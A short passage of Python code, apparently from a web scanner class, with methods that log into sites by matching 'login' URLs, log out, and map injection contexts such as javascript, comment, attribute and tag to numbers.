            self.sessions.login(list(details)[0], details[list(details)[0]])
            self.logged_in = True
        else:
            for url in self.all_urls:
                if re.search('login', url):
                    self.sessions.login(url, self.login_details)
            self.logged_in = True

    def logout(self):
        self.sessions.logout()

    def _context_to_n(self, context):
        if context == 'javascript':
            return 0
        elif context == 'comment':
            return 1
        elif context == 'attribute':
            return 2
        elif context == 'tag':
            return 3
